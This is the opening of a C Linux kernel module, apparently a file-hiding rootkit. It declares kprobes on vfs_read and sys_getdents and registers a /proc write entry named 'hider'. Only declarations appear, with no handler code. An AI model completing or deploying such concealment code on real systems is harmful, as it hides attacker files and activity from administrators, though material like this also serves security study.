#include <linux/module.h> 
#include <linux/kernel.h> 
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/cred.h>

//no way to import. copy fom /fs/readdir.c
struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[1];
};

struct getdents_callback {
	struct dir_context ctx;
	struct linux_dirent __user *current_dir;
	struct linux_dirent __user *previous;
	int count;
	int error;
};


char *get_file_name_from_path(char*);
static int handler_pre_vfs_read(struct kprobe *, struct pt_regs*);
static int handler_fault(struct kprobe*, struct pt_regs*, int);
static int ret_handler_sys_getdents(struct kretprobe_instance*, struct pt_regs*);
static int handler_sys_getdents(struct kprobe*, struct pt_regs*);
ssize_t hider_write_file(struct file*, const char __user*, size_t, loff_t*);
int init_module(void);
void cleanup_module(void);

static struct kprobe kp_read = {
	.symbol_name = "vfs_read",
	.pre_handler = handler_pre_vfs_read,
	.fault_handler = handler_fault,
};

static struct kprobe kp_getdents = {
	.symbol_name = "sys_getdents",
	.pre_handler = handler_sys_getdents,
	.fault_handler = handler_fault,
};


static struct kretprobe kret_sys_getdents = {
	.handler = ret_handler_sys_getdents,
	.maxactive = NR_CPUS,
};

struct file_operations hider_ops = {.owner = THIS_MODULE,
									.write = hider_write_file,};
struct proc_dir_entry *hider_entry;



